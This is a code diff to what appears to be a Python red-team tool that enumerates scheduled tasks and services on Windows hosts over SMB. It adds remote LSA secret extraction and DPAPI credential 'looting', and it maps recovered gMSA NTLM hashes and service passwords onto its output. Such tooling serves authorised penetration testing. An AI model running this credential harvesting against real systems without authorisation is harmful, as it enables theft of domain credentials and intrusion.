@@ -8,7 +8,7 @@
 import contextlib
 import os
 import traceback
-from typing import Any, Dict, List, Optional, Tuple, Union
+from typing import Any
 
 from impacket.smbconnection import SessionError
 
@@ -26,7 +26,10 @@ from ..parsers.highvalue import HighValueLoader
 from ..parsers.task_xml import parse_task_xml
 from ..resolver import (
     format_runas_with_sid_resolution,
+    is_bare_name,
+    is_probably_local_bare_name,
     is_sid,
+    resolve_name_to_sid,
 )
 from ..smb.connection import (
     _dns_ptr_lookup,
@@ -53,7 +56,7 @@ from .helpers import (
 )
 
 
-def _match_decrypted_password(runas: str, decrypted_creds: List, resolved_runas: Optional[str] = None) -> Optional[str]:
+def _match_decrypted_password(runas: str, decrypted_creds: list, resolved_runas: str | None = None) -> str | None:
     """
     Match a task's runas field to decrypted credentials and return the password.
 
@@ -81,27 +84,32 @@ def _match_decrypted_password(runas: str, decrypted_creds: List, resolved_runas:
 
 def process_target(
     target: str,
-    all_rows: List[TaskRow],
+    all_rows: list[TaskRow],
     *,
     auth: AuthContext,
     include_ms: bool = False,
     include_local: bool = False,
-    hv: Optional[HighValueLoader] = None,
+    hv: HighValueLoader | None = None,
     debug: bool = False,
     show_unsaved_creds: bool = False,
-    backup_dir: Optional[str] = None,
+    backup_dir: str | None = None,
     credguard_detect: bool = False,
     no_ldap: bool = False,
     no_rpc: bool = False,
     loot: bool = False,
-    dpapi_key: Optional[str] = None,
-    bh_connector: Optional[Any] = None,
+    dpapi_key: str | None = None,
+    bh_connector: Any | None = None,
     concise: bool = False,
     opsec: bool = False,
-    laps_cache: Optional[LAPSCache] = None,
+    laps_cache: LAPSCache | None = None,
     validate_creds: bool = False,
     ldap_tier0: bool = False,
-) -> Tuple[List[str], Optional[Union[bool, LAPSFailure]]]:
+    match_bare_runas: bool = False,
+    no_lsa: bool = False,
+    services: bool = False,
+    services_only: bool = False,
+    all_service_rows: list | None = None,
+) -> tuple[list[str], bool | LAPSFailure | None]:
     """
     Connect to `target`, enumerate scheduled tasks, and return printable lines.
 
@@ -149,8 +157,8 @@ def process_target(
     ldap_hashes = auth.ldap_hashes
     gc_server = auth.gc_server
 
-    out_lines: List[str] = []
-    laps_result: Optional[Union[bool, LAPSFailure]] = None
+    out_lines: list[str] = []
+    laps_result: bool | LAPSFailure | None = None
 
     status(f"[Collecting] {target} ...")
 
@@ -171,7 +179,7 @@ def process_target(
     laps_type_used = None
     laps_cred = None  # Track LAPS credentials for RPC reuse
     discovered_hostname = None
-    cred_validation_results: Dict[str, TaskRunInfo] = {}  # RPC credential validation cache
+    cred_validation_results: dict[str, TaskRunInfo] = {}  # RPC credential validation cache
 
     try:
         # LAPS Mode: Two-phase connection (negotiate -> lookup -> auth)
@@ -324,7 +332,9 @@ def process_target(
 
         # Credential Guard detection (EXPERIMENTAL, only if enabled)
         # Skipped when RPC is disabled (remote registry requires RPC)
-        if credguard_detect and not no_rpc:
+        # Skipped when --loot + --no-lsa is NOT set: LSA extraction via regsecrets
+        # will start RemoteRegistry anyway, so doing it twice is wasteful and noisy
+        if credguard_detect and not no_rpc and not (loot and not no_lsa):
             credguard_status = check_credential_guard(smb, target)
             if credguard_status is True:
                 warn(f"{target}: Credential Guard detected - DPAPI credential extraction will fail")
@@ -427,37 +437,44 @@ def process_target(
                 smb.close()
             return out_lines, laps_result
 
-    if not include_ms:
-        info(f"{target}: Crawling Scheduled Tasks (skipping \\Microsoft for speed)")
-    else:
-        warn(f"{target}: Crawling ALL Scheduled Tasks, including \\Microsoft (this may be slow!)")
+    # Set hostname for all output paths (tasks + services)
+    hostname = server_fqdn if server_fqdn else target
 
-    try:
-        items = crawl_tasks(smb, include_ms=include_ms)
-    except SessionError:
-        if debug:
-            traceback.print_exc()
-        status(f"[Collecting] {target} [-] (Access Denied)")
-        all_rows.append(TaskRow.failure(
-            target,
-            "Access Denied (Failed to crawl tasks)",
-        ))
-        warn(f"{target}: Failed to Crawl Tasks. Skipping... (Are you Local Admin?)", verbose_only=True)
-        with contextlib.suppress(Exception):
-            smb.close()
-        return out_lines, laps_result
-    except Exception as e:
-        if debug:
-            traceback.print_exc()
-        status(f"[Collecting] {target} [-] ({e})")
-        all_rows.append(TaskRow.failure(
-            target,
-            f"Crawling failed: {e}",
-        ))
-        warn(f"{target}: Unexpected error while crawling tasks: {e}", verbose_only=True)
-        with contextlib.suppress(Exception):
-            smb.close()
-        return out_lines, laps_result
+    # Skip task enumeration if --services-only
+    if services_only:
+        items = []
+    else:
+        if not include_ms:
+            info(f"{target}: Crawling Scheduled Tasks (skipping \\Microsoft for speed)")
+        else:
+            warn(f"{target}: Crawling ALL Scheduled Tasks, including \\Microsoft (this may be slow!)")
+
+        try:
+            items = crawl_tasks(smb, include_ms=include_ms)
+        except SessionError:
+            if debug:
+                traceback.print_exc()
+            status(f"[Collecting] {target} [-] (Access Denied)")
+            all_rows.append(TaskRow.failure(
+                target,
+                "Access Denied (Failed to crawl tasks)",
+            ))
+            warn(f"{target}: Failed to Crawl Tasks. Skipping... (Are you Local Admin?)", verbose_only=True)
+            with contextlib.suppress(Exception):
+                smb.close()
+            return out_lines, laps_result
+        except Exception as e:
+            if debug:
+                traceback.print_exc()
+            status(f"[Collecting] {target} [-] ({e})")
+            all_rows.append(TaskRow.failure(
+                target,
+                f"Crawling failed: {e}",
+            ))
+            warn(f"{target}: Unexpected error while crawling tasks: {e}", verbose_only=True)
+            with contextlib.suppress(Exception):
+                smb.close()
+            return out_lines, laps_result
 
     # First pass: identify tasks with Password logon type for credential validation
     # Credential validation requires RPC (Task Scheduler pipe), skip if no_rpc is set
@@ -502,20 +519,42 @@ def process_target(
             aes_key=rpc_aes_key,
             kerberos=rpc_kerberos,
             dc_ip=dc_ip,
-            opsec=no_rpc,  # Use no_rpc flag (opsec sets this)
+            opsec=opsec,
             debug=debug,
         )
 
-    # Create backup directory structure if backup is requested
-    backup_target_dir = setup_backup_directory(target, backup_dir, debug=debug)
+    # Create backup directory structure if backup is requested (skip for --services-only)
+    backup_target_dir = None
+    if not services_only:
+        backup_target_dir = setup_backup_directory(target, backup_dir, debug=debug)
 
-    # Perform automatic credential looting if requested
-    decrypted_creds: List[Any] = []
-    if loot:
+    # LSA extraction via registry-only approach (if --loot and not --no-lsa)
+    # This extracts DPAPI system keys AND service credentials in one pass
+    lsa_result = None
+    effective_dpapi_key = dpapi_key  # User-provided key takes priority
+    if loot and not no_lsa and not opsec:
+        from ..lsa.extractor import extract_lsa_secrets
+
+        lsa_result = extract_lsa_secrets(
+            smb,
+            server_fqdn or target,
+            kerberos=kerberos,
+            dc_host=dc_ip,
+        )
+
+        # Auto-feed DPAPI userkey for task credential decryption
+        if lsa_result.dpapi_userkey and not dpapi_key:
+            effective_dpapi_key = lsa_result.dpapi_userkey
+            if not services_only:
+                info(f"{target}: Using DPAPI key from LSA extraction for task credential decryption")
+
+    # Perform DPAPI credential looting (skip for --services-only — no tasks to decrypt)
+    decrypted_creds: list[Any] = []
+    if loot and not services_only:
         decrypted_creds, loot_lines = perform_dpapi_looting(
             target,
             smb,
-            dpapi_key=dpapi_key,
+            dpapi_key=effective_dpapi_key,
             backup_target_dir=backup_target_dir,
             debug=debug,
         )
@@ -524,8 +563,8 @@ def process_target(
     total = len(items)
     filtered_count = 0  # Count of tasks that pass should_include filter
     priv_count = 0
-    priv_lines: List[str] = []
-    task_lines: List[str] = []
+    priv_lines: list[str] = []
+    task_lines: list[str] = []
 
     # Pre-fetch pwdLastSet for all unique users via single LDAP batch query
     pwd_cache: PwdLastSetCache = prefetch_pwd_last_set(
@@ -549,7 +588,7 @@ def process_target(
     )
 
     # Pre-fetch Tier-0 group members via LDAP (pre-flight approach)
-    tier0_cache: Dict[str, Tuple[bool, list]] = prefetch_tier0_members(
+    tier0_cache: dict[str, tuple[bool, list]] = prefetch_tier0_members(
         target,
         domain=domain,
         dc_ip=dc_ip,
@@ -633,7 +672,7 @@ def process_target(
 
                 # Get known domain SID prefixes for unknown domain detection
                 # Pass full dict (prefix -> FQDN) for trust-aware display
-                known_prefixes: Optional[Dict[str, Any]] = hv.hv_domain_sids if hv and hasattr(hv, 'hv_domain_sids') and hv.hv_domain_sids else None
+                known_prefixes: dict[str, Any] | None = hv.hv_domain_sids if hv and hasattr(hv, 'hv_domain_sids') and hv.hv_domain_sids else None
 
                 _, row.resolved_runas = format_runas_with_sid_resolution(
                     runas,
@@ -657,6 +696,26 @@ def process_target(
                     known_domain_prefixes=known_prefixes,
                     gc_server=gc_server,
                 )
+
+        elif is_bare_name(runas) and not opsec and not no_ldap and not is_probably_local_bare_name(runas):
+            # Bare RunAs (no DOMAIN\ prefix, no UPN @): resolve it to a domain SID so the
+            # SID-aware Tier-0 / high-value matchers can identify it. A name that resolves in
+            # domain LDAP is provably a domain account (local accounts are not in LDAP), so this
+            # does not reintroduce the local-account false-positive the bare-name guard prevents.
+            bare_sid = resolve_name_to_sid(
+                runas,
+                domain=ldap_domain or domain,
+                is_computer=False,
+                hv_loader=hv,
+                dc_ip=dc_ip,
+                username=ldap_user or username,
+                password=ldap_password or password,
+                hashes=ldap_hashes or hashes,
+                kerberos=kerberos,
+            )
+            if bare_sid:
+                row.resolved_runas_sid = bare_sid
+                log_debug(f"{target}: Resolved bare RunAs '{runas}' -> {bare_sid}")
 
         # Enrich row with decrypted password if available from DPAPI loot
         if decrypted_creds:
@@ -690,6 +749,8 @@ def process_target(
             pwd_cache=pwd_cache,
             tier0_cache=tier0_cache,
             resolved_runas=row.resolved_runas,
+            resolved_runas_sid=row.resolved_runas_sid,
+            match_bare_runas=match_bare_runas,
         )
 
         if not result.should_include:
@@ -788,8 +849,104 @@ def process_target(
         status(f"[Collected] {target}: {total} Tasks, {priv_display} Privileged")
     good(f"{target}: Found {filtered_count} tasks (of {total} total), privileged {priv_display}{backup_msg}{laps_msg}")
 
+    # --- Service enumeration (if enabled) ---
+    service_lines: list[str] = []
+    if services:
+        from ..smb.local_users import enumerate_local_users
+        from .helpers import perform_service_enumeration
+
+        local_accounts: set | None = None
+        if not no_rpc:
+            try:
+                local_users_dict = enumerate_local_users(smb, server_fqdn or target)
+                local_accounts = set(local_users_dict.keys())
+            except Exception:
+                pass
+
+        svc_rows = perform_service_enumeration(
+            target,
+            smb,
+            server_fqdn or target,
+            target_ip=target,
+            computer_sid=server_sid,
+            local_accounts=local_accounts,
+            credguard_status=credguard_status,
+            hv=hv,
+            bh_connector=bh_connector,
+            no_ldap=no_ldap,
+            no_rpc=no_rpc,
+            domain=domain,
+            dc_ip=dc_ip,
+            username=username,
+            password=password,
+            hashes=hashes,
+            kerberos=kerberos,
+            aes_key=aes_key,
+            ldap_domain=ldap_domain,
+            ldap_user=ldap_user,
+            ldap_password=ldap_password,
+            ldap_hashes=ldap_hashes,
+            pwd_cache=pwd_cache,
+            tier0_cache=tier0_cache,
+            match_bare_runas=match_bare_runas,
+            debug=debug,
+        )
+
+        # Map LSA-extracted service credentials to service rows
+        if svc_rows and lsa_result and (lsa_result.service_credentials or lsa_result.gmsa_credentials):
+            from .helpers import _map_lsa_creds_to_service_rows
+
+            _map_lsa_creds_to_service_rows(
+                svc_rows, lsa_result.service_credentials, target,
+                gmsa_credentials=lsa_result.gmsa_credentials,
+                domain=domain,
+            )
+
+        # Map gMSA NTLM hashes to task rows running as gMSA accounts
+        if lsa_result and lsa_result.gmsa_credentials and all_rows:
+            from .helpers import _compute_gmsa_hmac
+
+            for row in all_rows:
+                runas = getattr(row, "runas", None) or ""
+                if not runas.endswith("$") or "\\" not in runas:
+                    continue
+                row_netbios = runas.split("\\")[0].upper()
+                account = runas.split("\\")[1]
+                expected_hmac = _compute_gmsa_hmac(row_netbios, account)
+                if expected_hmac:
+                    for gmsa_cred in lsa_result.gmsa_credentials:
+                        if gmsa_cred.gmsa_id == expected_hmac:
+                            row.decrypted_password = f"NTLM:{gmsa_cred.ntlm_hash}"
+                            break
+
+        if svc_rows and all_service_rows is not None:
+            all_service_rows.extend(svc_rows)
+
+        if svc_rows:
+            from ..output.printer import format_service_block
+
+            for svc_row in svc_rows:
+                service_lines.extend(
+                    format_service_block(
+                        kind=svc_row.type,
+                        service_name=svc_row.service_name,
+                        display_name=svc_row.display_name,
+                        start_name=svc_row.start_name,
+                        binary_path=svc_row.binary_path,
+                        start_type=svc_row.start_type,
+                        state=svc_row.state,
+                        is_gmsa=svc_row.is_gmsa,
+                        hostname=hostname,
+                        reason=svc_row.reason,
+                        password_analysis=svc_row.password_analysis,
+                        resolved_runas=svc_row.resolved_runas,
+                        credential_guard=svc_row.credential_guard,
+                        decrypted_password=svc_row.decrypted_password,
+                    )
+                )
+
     # Combine credential loot output with task listing output
     # Put credentials first since they're the most valuable
     with contextlib.suppress(Exception):
         smb.close()
-    return out_lines + sorted_lines, laps_result
+    return out_lines + sorted_lines + service_lines, laps_result
